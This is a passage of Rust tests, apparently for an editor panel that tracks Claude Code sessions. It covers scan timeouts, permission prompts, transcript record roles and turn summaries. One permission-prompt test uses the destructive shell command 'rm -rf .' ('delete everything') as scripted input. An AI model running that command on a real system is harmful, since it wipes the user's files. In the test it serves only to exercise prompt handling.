            &self,
            directory: PathBuf,
            query: String,
        ) -> Task<anyhow::Result<Vec<String>>> {
            self.scripted.list_session_files(directory, query)
        }

        fn write_session_file(
            &self,
            name: String,
            contents: Vec<u8>,
        ) -> Task<anyhow::Result<String>> {
            self.scripted.write_session_file(name, contents)
        }

        fn tail_subagent(
            &self,
            session_id: String,
            agent_id: String,
            workflow_run_id: Option<String>,
            state: TailState,
        ) -> Task<anyhow::Result<TailProgress>> {
            self.scripted
                .tail_subagent(session_id, agent_id, workflow_run_id, state)
        }

        fn read_file(
            &self,
            path: PathBuf,
            max_bytes: u64,
        ) -> Task<anyhow::Result<crate::session_source::FileContents>> {
            self.scripted.read_file(path, max_bytes)
        }

        fn read_attachment(
            &self,
            session_id: String,
            path: PathBuf,
            max_bytes: u64,
        ) -> Task<anyhow::Result<crate::session_source::FileContents>> {
            self.scripted.read_attachment(session_id, path, max_bytes)
        }

        fn channel_status(&self, claude_pid: u32) -> Task<anyhow::Result<ChannelStatus>> {
            self.scripted.channel_status(claude_pid)
        }

        fn channel_send_message(
            &self,
            claude_pid: u32,
            content: String,
        ) -> Task<anyhow::Result<String>> {
            self.scripted.channel_send_message(claude_pid, content)
        }

        fn channel_interrupt(
            &self,
            claude_pid: u32,
            reason: String,
        ) -> Task<anyhow::Result<String>> {
            self.scripted.channel_interrupt(claude_pid, reason)
        }

        fn channel_answer_permission(
            &self,
            claude_pid: u32,
            request_id: String,
            allow: bool,
        ) -> Task<anyhow::Result<String>> {
            self.scripted
                .channel_answer_permission(claude_pid, request_id, allow)
        }

        fn tail_channel_inbox(
            &self,
            claude_pid: u32,
            state: TailState,
        ) -> Task<anyhow::Result<TailProgress>> {
            self.scripted.tail_channel_inbox(claude_pid, state)
        }
    }

    fn store_on(
        listing: ListingBehaviour,
        cx: &mut gpui::TestAppContext,
    ) -> Entity<ClaudeSessionStore> {
        let source: Arc<dyn SessionSource> =
            Arc::new(UnansweredListing::new(listing, cx.executor()));
        cx.update(|cx| {
            cx.new(|cx| {
                let mut store = ClaudeSessionStore::new(source, None, cx);
                store.select(SCRIPTED_SESSION_ID, cx);
                store
            })
        })
    }

    /// Longer than any bound a poll may put on its own request.
    const LONG_ENOUGH_FOR_ANY_ANSWER: Duration = Duration::from_secs(300);

    /// A scan that is never answered has to be told apart from a scan that answered with
    /// nothing.
    ///
    /// The store's only channel to the reader is [`ClaudeSessionStore::error`], and an
    /// unanswered request leaves it empty: the conversation then draws
    /// `WAITING_FOR_TRANSCRIPT` — a sentence about the session having written no
    /// transcript — over a session that has written a large one, and says nothing about
    /// the host it never heard from.
    #[gpui::test]
    async fn a_scan_that_is_never_answered_is_reported_rather_than_drawn_as_no_transcript(
        cx: &mut gpui::TestAppContext,
    ) {
        let store = store_on(ListingBehaviour::NeverAnswered, cx);

        cx.run_until_parked();
        cx.executor().advance_clock(LONG_ENOUGH_FOR_ANY_ANSWER);
        cx.run_until_parked();

        let (listed, selected, _transcript_path, error) = store.read_with(cx, |store, _| {
            (
                store.sessions().len(),
                store.selected().map(str::to_string),
                store.transcript_path().map(Path::to_path_buf),
                store.error().cloned(),
            )
        });

        assert_eq!(
            (listed, selected.clone()),
            (0, Some(SCRIPTED_SESSION_ID.to_string())),
            "the state the reported symptom is drawn from: nothing listed, still selected; \
             expected (0, Some({SCRIPTED_SESSION_ID})), got ({listed}, {selected:?})"
        );
        assert!(
            error.is_some(),
            "a store that has heard nothing back must say so rather than leave the \
             conversation drawing {WAITING_FOR_TRANSCRIPT:?}; expected Some(message), got {error:?}"
        );
    }

    /// The case the store already has a path for, kept beside the one above so that the
    /// difference between them is a fact of the suite rather than a belief.
    #[gpui::test]
    async fn a_scan_the_host_refuses_is_already_reported(cx: &mut gpui::TestAppContext) {
        let store = store_on(ListingBehaviour::Refused, cx);

        cx.run_until_parked();
        cx.executor().advance_clock(A_FEW_POLLS);
        cx.run_until_parked();

        let error = store.read_with(cx, |store, _| store.error().cloned());
        assert!(
            error.is_some(),
            "a refusal is reported today; expected Some(message), got {error:?}"
        );
    }

    /// What a bound on the scan could wrongly kill: a host that is merely slow.
    ///
    /// A listing that arrives inside the bound is the same listing, and a store that
    /// discarded it would be trading a silent wrong answer for a loud one.
    #[gpui::test]
    async fn a_slow_scan_that_does_arrive_is_still_applied(cx: &mut gpui::TestAppContext) {
        let nearly_the_bound = REGISTRY_SCAN_TIMEOUT.saturating_sub(Duration::from_secs(1));
        let store = store_on(ListingBehaviour::AnsweredAfter(nearly_the_bound), cx);

        cx.run_until_parked();
        cx.executor()
            .advance_clock(nearly_the_bound + Duration::from_secs(1));
        cx.run_until_parked();

        let (listed, error) = store.read_with(cx, |store, _| {
            (store.sessions().len(), store.error().cloned())
        });
        assert_eq!(
            listed, 1,
            "a listing that arrived inside the bound must be applied; expected 1, got {listed}"
        );
        assert_eq!(
            error, None,
            "a listing that arrived must leave nothing to report; expected None, got {error:?}"
        );
    }

    /// A tab is opened for a session the dock has already listed, and it must read that
    /// session's conversation whether or not its own scan ever lands.
    ///
    /// The dock holds the whole [`RegisteredSession`] — its `sessionId`, and the file the
    /// scan found — at the moment the tab is opened, and hands over a process id and
    /// nothing else. Everything the tab draws is reached through its own `sessions`, so
    /// one unanswered request leaves it with no session id to follow, no read to issue
    /// and no name to put in its tab.
    #[gpui::test]
    async fn a_tab_reads_the_session_it_was_opened_for_without_a_scan_of_its_own(
        cx: &mut gpui::TestAppContext,
    ) {
        let source: Arc<dyn SessionSource> = Arc::new(UnansweredListing::new(
            ListingBehaviour::NeverAnswered,
            cx.executor(),
        ));
        let transcript_path = PathBuf::from("/scripted-home/session.jsonl");
        let store = cx.update(|cx| {
            cx.new(|cx| {
                let mut store = ClaudeSessionStore::new(source, None, cx);
                store.seed_session(
                    scripted_registered_session(),
                    Some(transcript_path.clone()),
                    cx,
                );
                store.select(SCRIPTED_SESSION_ID, cx);
                store
            })
        });

        cx.run_until_parked();
        cx.executor().advance_clock(A_FEW_POLLS);
        cx.run_until_parked();

        let (listed, selected, found) = store.read_with(cx, |store, _| {
            (
                store.sessions().len(),
                store.selected().map(str::to_string),
                store.transcript_path().map(Path::to_path_buf),
            )
        });
        assert_eq!(
            (listed, selected.clone()),
            (1, Some(SCRIPTED_SESSION_ID.to_string())),
            "the session the tab was opened for is known to it from the start; \
             expected (1, Some({SCRIPTED_SESSION_ID})), got ({listed}, {selected:?})"
        );
        assert_eq!(
            found,
            Some(transcript_path.clone()),
            "a tab handed the file the dock had already found must read it; \
             expected {transcript_path:?}, got {found:?}"
        );
    }

    /// The seed is what the dock last saw, not the truth forever: a scan that does land
    /// and does not list that session id keeps it as an ended row rather than pretending
    /// it is still live.
    #[gpui::test]
    async fn a_seeded_session_gives_way_to_a_scan_that_does_not_list_it(
        cx: &mut gpui::TestAppContext,
    ) {
        let source: Arc<dyn SessionSource> = Arc::new(UnansweredListing::new(
            ListingBehaviour::AnsweredAfter(Duration::ZERO),
            cx.executor(),
        ));
        let store = cx.update(|cx| {
            cx.new(|cx| {
                let mut store = ClaudeSessionStore::new(source, None, cx);
                let mut departed = scripted_registered_session();
                departed.process_id = SCRIPTED_PROCESS_ID + 1;
                departed.session_id = "a-session-that-has-exited".to_string();
                store.seed_session(departed, Some(PathBuf::from("/gone.jsonl")), cx);
                store.select("a-session-that-has-exited", cx);
                store
            })
        });

        cx.run_until_parked();
        cx.executor().advance_clock(A_FEW_POLLS);
        cx.run_until_parked();

        let (process_ids, selected, ended) = store.read_with(cx, |store, _| {
            (
                store
                    .sessions()
                    .iter()
                    .map(|session| session.process_id)
                    .collect::<Vec<_>>(),
                store.selected().map(str::to_string),
                store
                    .ended_sessions()
                    .iter()
                    .map(|session| (session.session_id.clone(), session.ended_reason))
                    .collect::<Vec<_>>(),
            )
        });
        assert_eq!(
            process_ids,
            vec![SCRIPTED_PROCESS_ID],
            "the scan's live list replaces the seed; expected [{SCRIPTED_PROCESS_ID}], \
             got {process_ids:?}"
        );
        assert_eq!(
            selected.as_deref(),
            Some("a-session-that-has-exited"),
            "an ended session stays selected so its transcript can still be read; \
             expected Some(a-session-that-has-exited), got {selected:?}"
        );
        assert_eq!(
            ended,
            vec![(
                "a-session-that-has-exited".to_string(),
                EndedReason::ProcessGone
            )],
            "the seed that the scan did not list is kept as an ended row"
        );
    }

    /// A source that hands the store scripted hook events and scripted channel inbox
    /// lines over a live channel, so that a test can put two prompts one poll apart.
    /// Every other read is [`ScriptedSource`]'s.
    struct PromptSource {
        inner: ScriptedSource,
        event_lines: Mutex<Vec<String>>,
        inbox_lines: Mutex<Vec<String>>,
        message_sends: Mutex<Vec<String>>,
        message_failures_remaining: AtomicUsize,
    }

    impl PromptSource {
        fn new() -> Self {
            Self {
                inner: ScriptedSource::new(&[], &[]),
                event_lines: Mutex::new(Vec::new()),
                inbox_lines: Mutex::new(Vec::new()),
                message_sends: Mutex::new(Vec::new()),
                message_failures_remaining: AtomicUsize::new(0),
            }
        }

        /// Queues one poll's worth of each tail.
        fn deliver(&self, events: &[String], inbox: &[String]) {
            self.event_lines
                .lock()
                .expect("queueing the scripted events")
                .extend_from_slice(events);
            self.inbox_lines
                .lock()
                .expect("queueing the scripted inbox")
                .extend_from_slice(inbox);
        }
    }

    impl SessionSource for PromptSource {
        fn list_sessions(
            &self,
            project_root: Option<PathBuf>,
        ) -> Task<anyhow::Result<SessionListing>> {
            self.inner.list_sessions(project_root)
        }

        fn tail_transcript(
            &self,
            session_id: String,
            state: TailState,
        ) -> Task<anyhow::Result<TailProgress>> {
            self.inner.tail_transcript(session_id, state)
        }

        fn list_subagents(&self, session_id: String) -> Task<anyhow::Result<Vec<SubagentSummary>>> {
            self.inner.list_subagents(session_id)
        }

        fn list_subagents_for_sessions(
            &self,
            session_ids: Vec<String>,
        ) -> Task<anyhow::Result<HashMap<String, Vec<SubagentSummary>>>> {
            self.inner.list_subagents_for_sessions(session_ids)
        }

        fn tail_events(
            &self,
            _session_id: String,
            state: TailState,
        ) -> Task<anyhow::Result<TailProgress>> {
            ScriptedSource::deliver(
                &self.event_lines,
                PathBuf::from("/scripted-home/events.jsonl"),
                state,
            )
        }

        fn read_status(&self, session_id: String) -> Task<anyhow::Result<Option<String>>> {
            self.inner.read_status(session_id)
        }

        fn install_hooks(&self) -> Task<anyhow::Result<HookInstallOutcome>> {
            self.inner.install_hooks()
        }

        fn hooks_installed(&self) -> Task<anyhow::Result<bool>> {
            self.inner.hooks_installed()
        }

        fn list_slash_commands(
            &self,
            project_root: Option<PathBuf>,
        ) -> Task<anyhow::Result<Vec<SlashCommand>>> {
            self.inner.list_slash_commands(project_root)
        }

        fn list_session_files(
            &self,
            directory: PathBuf,
            query: String,
        ) -> Task<anyhow::Result<Vec<String>>> {
            self.inner.list_session_files(directory, query)
        }

        fn write_session_file(
            &self,
            name: String,
            contents: Vec<u8>,
        ) -> Task<anyhow::Result<String>> {
            self.inner.write_session_file(name, contents)
        }

        fn tail_subagent(
            &self,
            session_id: String,
            agent_id: String,
            workflow_run_id: Option<String>,
            state: TailState,
        ) -> Task<anyhow::Result<TailProgress>> {
            self.inner
                .tail_subagent(session_id, agent_id, workflow_run_id, state)
        }

        fn read_file(&self, path: PathBuf, max_bytes: u64) -> Task<anyhow::Result<FileContents>> {
            self.inner.read_file(path, max_bytes)
        }

        fn read_attachment(
            &self,
            session_id: String,
            path: PathBuf,
            max_bytes: u64,
        ) -> Task<anyhow::Result<FileContents>> {
            self.inner.read_attachment(session_id, path, max_bytes)
        }

        fn channel_status(&self, _claude_pid: u32) -> Task<anyhow::Result<ChannelStatus>> {
            Task::ready(Ok(ChannelStatus {
                live: true,
                heartbeat_at_ms: Some(now_millis()),
                server_pid: Some(11),
                features: vec!["message".into(), "permission".into(), "interrupt".into()],
            }))
        }

        fn channel_send_message(
            &self,
            _claude_pid: u32,
            content: String,
        ) -> Task<anyhow::Result<String>> {
            self.message_sends
                .lock()
                .expect("recording a message send")
                .push(content);
            if self
                .message_failures_remaining
                .fetch_update(Ordering::SeqCst, Ordering::SeqCst, |remaining| {
                    remaining.checked_sub(1)
                })
                .is_ok()
            {
                return Task::ready(Err(anyhow::anyhow!("scripted send failure")));
            }
            Task::ready(Ok("0000000000001-0001.json".to_string()))
        }

        fn channel_interrupt(
            &self,
            _claude_pid: u32,
            _reason: String,
        ) -> Task<anyhow::Result<String>> {
            Task::ready(Ok("0000000000003-0003.json".to_string()))
        }

        fn channel_answer_permission(
            &self,
            _claude_pid: u32,
            _request_id: String,
            _allow: bool,
        ) -> Task<anyhow::Result<String>> {
            Task::ready(Ok("0000000000002-0002.json".to_string()))
        }

        fn tail_channel_inbox(
            &self,
            _claude_pid: u32,
            state: TailState,
        ) -> Task<anyhow::Result<TailProgress>> {
            ScriptedSource::deliver(
                &self.inbox_lines,
                PathBuf::from("/scripted-home/inbox.jsonl"),
                state,
            )
        }
    }

    /// One line of `~/.claude/zed-events/<id>.jsonl`, in the wrapper the hook writes.
    fn hook_event_line(received_at_ms: i64, name: &str, extra: serde_json::Value) -> String {
        let mut event = extra;
        let object = event
            .as_object_mut()
            .expect("a hook event's extras are an object");
        object.insert("hook_event_name".into(), serde_json::json!(name));
        object.insert("session_id".into(), serde_json::json!(SCRIPTED_SESSION_ID));
        serde_json::json!({ "received_at_ms": received_at_ms, "event": event }).to_string()
    }

    /// The two prompts of one turn can land in a single poll: the tool the reader allowed
    /// finishes and the next permission is asked for before the next read. The second
    /// prompt has not been answered by anyone, so it must draw its own buttons.
    #[gpui::test]
    async fn a_second_permission_prompt_is_not_drawn_as_already_answered(
        cx: &mut gpui::TestAppContext,
    ) {
        let source = Arc::new(PromptSource::new());
        let panel = scripted_panel_over(source.clone(), cx);
        read_the_scripted_session(&panel, cx);
        let asked_at_ms = now_millis();
        source.deliver(
            &[hook_event_line(
                asked_at_ms,
                "PermissionRequest",
                serde_json::json!({
                    "tool_use_id": "toolu_first",
                    "tool_name": "Bash",
                    "tool_input": { "command": "ls" },
                }),
            )],
            &[serde_json::json!({
                "kind": "permission_request",
                "at_ms": asked_at_ms,
                "request_id": "aaaaa",
                "tool_name": "Bash",
                "description": "run ls",
                "input_preview": "ls",
            })
            .to_string()],
        );
        cx.executor().advance_clock(A_FEW_POLLS);
        cx.run_until_parked();

        panel.update(cx, |panel, cx| {
            let open = panel.store.read(cx).open_permission_request_id();
            assert_eq!(
                open.as_deref(),
                Some("aaaaa"),
                "the first prompt must be answerable before it is answered; expected \
                 Some(\"aaaaa\"), got {open:?}"
            );
            panel.answer_permission(true, cx);
        });
        cx.run_until_parked();
        panel.read_with(cx, |panel, _| {
            assert!(
                panel.permission_answered,
                "the answered card is what the reader sees until the session moves on"
            );
        });

        let second_at_ms = asked_at_ms + 200;
        source.deliver(
            &[
                hook_event_line(
                    second_at_ms,
                    "PostToolUse",
                    serde_json::json!({
                        "tool_use_id": "toolu_first",
                        "tool_name": "Bash",
                    }),
                ),
                hook_event_line(
                    second_at_ms,
                    "PermissionRequest",
                    serde_json::json!({
                        "tool_use_id": "toolu_second",
                        "tool_name": "Bash",
                        "tool_input": { "command": "rm -rf ." },
                    }),
                ),
            ],
            &[serde_json::json!({
                "kind": "permission_request",
                "at_ms": second_at_ms,
                "request_id": "bbbbb",
                "tool_name": "Bash",
                "description": "delete everything",
                "input_preview": "rm -rf .",
            })
            .to_string()],
        );
        cx.executor().advance_clock(A_FEW_POLLS);
        cx.run_until_parked();

        let (answered, open) = panel.update(cx, |panel, cx| {
            (
                panel.permission_answered,
                panel.store.read(cx).open_permission_request_id(),
            )
        });
        assert_eq!(
            open.as_deref(),
            Some("bbbbb"),
            "the second prompt is the one waiting; expected Some(\"bbbbb\"), got {open:?}"
        );
        assert!(
            !answered,
            "a prompt nobody has answered must draw Allow and Deny; expected \
             permission_answered false, got {answered}"
        );
    }

    fn tool_use_block(name: &str, input: Value) -> Value {
        serde_json::json!({ "name": name, "input": input })
    }

    #[test]
    fn a_peer_record_is_a_peer_message_not_you() {
        let entries = entries_of(&[
            r#"{"type":"user","uuid":"a","isMeta":true,"origin":{"kind":"peer","from":"Explore"},"promptSource":"system","message":{"content":"Another Claude session sent a message:\n<agent-message from=\"Explore\">hello from peer</agent-message>"}}"#,
        ]);
        assert_eq!(entries.len(), 1);
        match &entries[0].kind {
            EntryKind::Message { role, source, .. } => {
                assert!(
                    matches!(role, MessageRole::Peer { from } if from.as_deref() == Some("Explore")),
                    "peer origin must not be labelled as the reader"
                );
                assert_eq!(role.label().as_ref(), "Message from Explore");
                assert_eq!(source.as_ref(), "hello from peer");
            }
            _ => panic!("expected a peer message"),
        }
    }

    #[test]
    fn a_channel_record_is_the_readers_own_message() {
        let typed = "可以了 channel connected";
        let entries = entries_of(&[&channel_record_line(
            "ff1c744b-channel",
            &channel_envelope(typed),
        )]);
        assert_eq!(entries.len(), 1, "a channel record is one message");
        match &entries[0].kind {
            EntryKind::Message { role, source, .. } => {
                assert_eq!(role, &MessageRole::User, "it is the reader's own words");
                assert_eq!(source.as_ref(), typed);
            }
            other => panic!(
                "expected a user message, got {}",
                match other {
                    EntryKind::Unknown { label, .. } => label.to_string(),
                    _ => "a different entry".to_string(),
                }
            ),
        }
        assert!(
            !entries.iter().any(entry_holds_channel_open),
            "no <channel survives in the drawn entries; sources: {:?}",
            message_sources(&entries)
        );
    }

    #[test]
    fn a_channel_record_keeps_an_inner_closing_tag() {
        let typed = "before </channel> after";
        let entries = entries_of(&[&channel_record_line("a", &channel_envelope(typed))]);
        match &entries[0].kind {
            EntryKind::Message { role, source, .. } => {
                assert_eq!(role, &MessageRole::User);
                assert_eq!(
                    source.as_ref(),
                    typed,
                    "a quoted </channel> is part of the message, not the wrapper"
                );
            }
            _ => panic!("expected a user message"),
        }
    }

    #[test]
    fn a_channel_record_that_is_not_wrapped_is_drawn_unchanged() {
        let typed = "plain words, not wrapped";
        let entries = entries_of(&[&channel_record_line("a", typed)]);
        match &entries[0].kind {
            EntryKind::Message { role, source, .. } => {
                assert_eq!(role, &MessageRole::User);
                assert_eq!(source.as_ref(), typed);
            }
            _ => panic!("expected a user message"),
        }
    }

    /// The outermost wrapper is the envelope and everything inside it is the message, so
    /// a reader quoting a whole `<channel …>…</channel>` gets it back byte for byte.
    #[test]
    fn a_channel_record_keeps_a_whole_envelope_the_reader_quoted() {
        let typed = "use <channel source=\"zed-claude\" from=\"zed\">like this</channel> to send";
        let entries = entries_of(&[&channel_record_line("a", &channel_envelope(typed))]);
        match &entries[0].kind {
            EntryKind::Message { role, source, .. } => {
                assert_eq!(role, &MessageRole::User);
                assert_eq!(
                    source.as_ref(),
                    typed,
                    "only the outermost envelope is the wrapper"
                );
            }
            _ => panic!("expected a user message"),
        }
    }

    /// Reading `origin.kind == "channel"` as the reader's own must not have moved anything
    /// else: a peer's hand-back, a task notification, and a record that is nothing but
    /// context the CLI injected all keep the role and the visibility they had.
    #[test]
    fn only_the_channel_origin_became_the_readers_own() {
        let entries = entries_of(&[
            r#"{"type":"user","uuid":"a","origin":{"kind":"peer","from":"Explore"},"message":{"content":"hello from peer"}}"#,
            r#"{"type":"user","uuid":"b","origin":{"kind":"task-notification"},"promptSource":"system","message":{"content":"<task-notification>\n<task-id>t1</task-id>\n</task-notification>"}}"#,
            r#"{"type":"user","uuid":"c","promptSource":"system","message":{"content":"injected context, no origin"}}"#,
            &channel_record_line("d", &channel_envelope("mine")),
        ]);

        let mine: Vec<SharedString> = user_messages(&entries)
            .into_iter()
            .map(|(_, source)| source)
            .collect();
        assert_eq!(
            mine,
            vec![SharedString::from("mine")],
            "only the channel record is the reader's own"
        );
        assert!(
            entries.iter().any(|entry| matches!(
                &entry.kind,
                EntryKind::Message {
                    role: MessageRole::Peer { from },
                    ..
                } if from.as_deref() == Some("Explore")
            )),
            "the peer hand-back is still the peer's; entries: {:?}",
            message_sources(&entries)
        );
        assert!(
            entries.iter().any(|entry| matches!(
                &entry.kind,
                EntryKind::Message {
                    role: MessageRole::System,
                    source,
                    ..
                } if source.as_ref() == "injected context, no origin"
            )),
            "a promptSource=system record with no origin is still the session's own \
             context; entries: {:?}",
            message_sources(&entries)
        );
    }

    #[test]
    fn a_task_notification_record_is_not_a_message() {
        let entries = entries_of(&[
            r#"{"type":"user","uuid":"a","origin":{"kind":"task-notification"},"promptSource":"system","message":{"content":"<task-notification>\n<task-id>byygs214e</task-id>\n<status>completed</status>\n</task-notification>"}}"#,
        ]);
        assert!(
            message_sources(&entries).is_empty(),
            "a task-notification is not a message anyone typed"
        );
    }

    #[test]
    fn a_task_notification_with_system_text_goes_to_context() {
        let entries = entries_of(&[
            r#"{"type":"user","uuid":"a","origin":{"kind":"task-notification"},"promptSource":"system","message":{"content":"[SYSTEM NOTIFICATION]\nidle\n<task-notification>\n<task-id>t1</task-id>\n</task-notification>"}}"#,
        ]);
        assert!(message_sources(&entries).is_empty());
        let items = entries.iter().find_map(|entry| match &entry.kind {
            EntryKind::Attachments { items } => Some(items),
            _ => None,
        });
        let Some(items) = items else {
            panic!("the leftover system notification belongs in Context");
        };
        assert!(
            items.iter().any(|item| item.body.contains("idle")),
            "got {:?}",
            items
                .iter()
                .map(|item| item.body.as_ref())
                .collect::<Vec<_>>()
        );
    }

    #[test]
    fn a_human_typed_record_is_the_reader() {
        let entries = entries_of(&[
            r#"{"type":"user","uuid":"a","origin":{"kind":"human"},"promptSource":"typed","message":{"content":"hello"}}"#,
        ]);
        match &entries[0].kind {
            EntryKind::Message { role, .. } => assert_eq!(role, &MessageRole::User),
            _ => panic!("expected a user message"),
        }
    }

    #[test]
    fn a_legacy_record_without_origin_fields_keeps_todays_behaviour() {
        let entries = entries_of(&[
            r#"{"type":"user","uuid":"a","message":{"content":"hello"}}"#,
            r#"{"type":"user","uuid":"b","isMeta":true,"message":{"content":"injected"}}"#,
        ]);
        assert_eq!(message_sources(&entries), vec![SharedString::from("hello")]);
    }

    #[test]
    fn away_summary_is_a_system_note() {
        let entries = entries_of(&[
            r#"{"type":"system","subtype":"away_summary","uuid":"a","content":"you missed two replies"}"#,
        ]);
        match &entries[0].kind {
            EntryKind::SystemNote { subtype, text, url } => {
                assert_eq!(subtype.as_ref(), "away_summary");
                assert_eq!(text.as_ref(), "you missed two replies");
                assert!(url.is_none());
            }
            _ => panic!("expected a system note"),
        }
    }

    #[test]
    fn bridge_status_is_a_system_note_with_a_url() {
        let entries = entries_of(&[
            r#"{"type":"system","subtype":"bridge_status","uuid":"a","content":"connected","url":"https://claude.ai/code/session_01"}"#,
        ]);
        match &entries[0].kind {
            EntryKind::SystemNote { subtype, url, .. } => {
                assert_eq!(subtype.as_ref(), "bridge_status");
                assert_eq!(url.as_deref(), Some("https://claude.ai/code/session_01"));
            }
            _ => panic!("expected a system note with a url"),
        }
    }

    #[test]
    fn an_unknown_system_subtype_without_content_is_raw_json() {
        let entries = entries_of(&[r#"{"type":"system","subtype":"future_note","uuid":"a"}"#]);
        match &entries[0].kind {
            EntryKind::Unknown { label, raw } => {
                assert_eq!(label.as_ref(), "system / future_note");
                assert!(raw.contains("future_note"));
            }
            _ => panic!("expected unrecognized JSON"),
        }
    }

    #[test]
    fn a_stop_hook_summary_is_not_drawn() {
        let entries = entries_of(&[
            r#"{"type":"system","subtype":"stop_hook_summary","hookCount":1,"hookInfos":[{"command":"'/Users/andy/.claude/hooks/zed-claude-events.sh'","durationMs":62}],"hookErrors":[],"hookAdditionalContext":[],"preventedContinuation":false,"stopReason":"","hasOutput":false,"level":"suggestion","timestamp":"2026-09-18T13:43:20.174Z","uuid":"stop-hook","toolUseID":"toolu_stop"}"#,
            r#"{"type":"system","subtype":"away_summary","uuid":"b","content":"you missed two replies"}"#,
            r#"{"type":"system","subtype":"future_note","uuid":"c"}"#,
        ]);
        assert_eq!(
            entries.len(),
            2,
            "stop_hook_summary draws nothing; the other two records stay; keys: {:?}",
            entries.iter().map(|entry| &entry.key).collect::<Vec<_>>()
        );
        match &entries[0].kind {
            EntryKind::SystemNote { subtype, text, .. } => {
                assert_eq!(subtype.as_ref(), "away_summary");
                assert_eq!(text.as_ref(), "you missed two replies");
            }
            _ => panic!("a system record that carries content still draws its note"),
        }
        match &entries[1].kind {
            EntryKind::Unknown { label, .. } => {
                assert_eq!(label.as_ref(), "system / future_note");
            }
            _ => panic!("an unknown subtype with no content still draws Unrecognized"),
        }
    }

    /// The record is dropped because it is bookkeeping with nothing in it. A hook that
    /// printed something for the reader writes that into this same record, and no other
    /// record holds it.
    #[test]
    fn a_stop_hook_summary_that_carries_content_still_draws_its_note() {
        let entries = entries_of(&[
            r#"{"type":"system","subtype":"stop_hook_summary","uuid":"a","hookCount":1,
"hasOutput":true,"content":"the release hook refused: the tree is dirty"}"#,
        ]);
        match entries.first().map(|entry| &entry.kind) {
            Some(EntryKind::SystemNote { subtype, text, .. }) => {
                assert_eq!(subtype.as_ref(), "stop_hook_summary");
                assert_eq!(text.as_ref(), "the release hook refused: the tree is dirty");
            }
            other => panic!(
                "expected one SystemNote carrying \"the release hook refused: the tree \
                 is dirty\"; got {} entries, the first being {}",
                entries.len(),
                match other {
                    None => "nothing at all".to_string(),
                    Some(EntryKind::Unknown { label, .. }) => format!("Unrecognized {label}"),
                    Some(_) => "another kind of entry".to_string(),
                }
            ),
        }
    }

    #[test]
    fn tokens_left_is_formatted_in_millions() {
        assert_eq!(tokens_left_quantity(15_000_000), "15.0M");
        assert_eq!(tokens_left_quantity(987_000), "987K");
        assert_eq!(tokens_left_quantity(12_300), "12.3K");
        assert_eq!(tokens_left_fact(15_000_000).as_ref(), "15.0M tokens left");
    }

    fn test_status_snapshot() -> StatusSnapshot {
        StatusSnapshot {
            model_id: None,
            model_display_name: None,
            context_window_size: None,
            context_used_percentage: None,
            total_input_tokens: None,
            total_output_tokens: None,
            total_cost_usd: None,
            effort: None,
            five_hour_used_percentage: None,
            five_hour_resets_at: None,
            seven_day_used_percentage: None,
            seven_day_resets_at: None,
            exceeds_200k_tokens: None,
        }
    }

    fn user_turn_entry(uuid: &str, text: &str) -> Entry {
        Entry {
            key: SharedString::from(uuid),
            kind: EntryKind::Message {
                role: MessageRole::User,
                source: SharedString::from(text),
                usage: None,
                answered_at: None,
            },
        }
    }

    fn assistant_turn_entry(uuid: &str, text: &str) -> Entry {
        Entry {
            key: SharedString::from(uuid),
            kind: EntryKind::Message {
                role: MessageRole::Assistant,
                source: SharedString::from(text),
                usage: None,
                answered_at: None,
            },
        }
    }

    fn peer_turn_entry(uuid: &str) -> Entry {
        Entry {
            key: SharedString::from(uuid),
            kind: EntryKind::Message {
                role: MessageRole::Peer { from: None },
                source: SharedString::from("from a peer"),
                usage: None,
                answered_at: None,
            },
        }
    }

    fn tool_use_turn_entry(key: &str, name: &str, input: Value, id: &str) -> Entry {
        Entry {
            key: SharedString::from(key),
            kind: EntryKind::ToolUse {
                name: SharedString::from(name),
                input: SharedString::from(input.to_string()),
                id: Some(SharedString::from(id)),
                diff: None,
            },
        }
    }

    fn tool_result_turn_entry(key: &str) -> Entry {
        Entry {
            key: SharedString::from(key),
            kind: EntryKind::ToolResult {
                label: SharedString::from("Write"),
                is_error: false,
                body: ToolResultBody::Inline(SharedString::from("ok")),
                tool_use_id: None,
            },
        }
    }

    fn turn_footer_entry(key: &str, duration_ms: u64) -> Entry {
        Entry {
            key: SharedString::from(key),
            kind: EntryKind::TurnFooter {
                duration_ms,
                message_count: 2,
                pending_background_agents: 0,
            },
        }
    }

    #[test]
    fn collapse_turns_summarises_finished_turns_and_keeps_the_running_one_open() {
        let write_a = serde_json::json!({ "file_path": "/a.rs" });
        let write_b = serde_json::json!({ "file_path": "/b.rs" });
        let write_a_again = serde_json::json!({ "file_path": "/a.rs" });
        let entries = vec![
            user_turn_entry("u1", "one"),
            tool_use_turn_entry("u1#0", "Write", write_a, "t1"),
            tool_result_turn_entry("u1#1"),
            tool_use_turn_entry("u1#2", "Write", write_b, "t2"),
            turn_footer_entry("u1#f", 41_000),
            user_turn_entry("u2", "two"),
            tool_use_turn_entry("u2#0", "Agent", serde_json::json!({ "prompt": "go" }), "t3"),
            tool_use_turn_entry("u2#1", "Write", write_a_again, "t4"),
            turn_footer_entry("u2#f", 12_000),
            user_turn_entry("u3", "three"),
            tool_use_turn_entry(
                "u3#0",
                "Read",
                serde_json::json!({ "file_path": "/c.rs" }),
                "t5",
            ),
        ];
        let mut agent_calls = HashMap::default();
        agent_calls.insert(
            SharedString::from("u2#0"),
            AgentCall {
                tool_use_id: SharedString::from("t3"),
                is_workflow: false,
            },
        );

        let collapsed = collapse_turns(
            entries.clone(),
            &HashSet::default(),
            false,
            true,
            &agent_calls,
            &HashMap::default(),
        );

        let summaries: Vec<_> = collapsed
            .iter()
            .filter_map(|entry| match &entry.kind {
                EntryKind::TurnSummary {
                    turn_id,
                    calls,
                    files_edited,
                    agents,
                    duration_ms,
                    is_expanded,
                    ..
                } => Some((
                    turn_id.as_ref(),
                    *calls,
                    files_edited.len(),
                    *agents,
                    *duration_ms,
                    *is_expanded,
                )),
                _ => None,
            })
            .collect();
        assert_eq!(
            summaries,
            vec![
                ("u1", 2, 2, 0, Some(41_000), false),
                ("u2", 2, 1, 1, Some(12_000), false),
            ],
            "finished turns collapse; the running turn has no summary: {summaries:?}"
        );
        assert!(
            collapsed.iter().any(|entry| entry.key.as_ref() == "u3#0"),
            "the current running turn keeps its tool entries"
        );
        assert!(
            !collapsed.iter().any(|entry| matches!(
                &entry.kind,
                EntryKind::TurnSummary { turn_id, .. } if turn_id.as_ref() == "u3"
            )),
            "the current running turn is not summarised"
        );

        let mut expanded = HashSet::default();
        expanded.insert(SharedString::from("u1"));
        let restored = collapse_turns(
            entries,
            &expanded,
            false,
            true,
            &agent_calls,
            &HashMap::default(),
        );
        assert!(
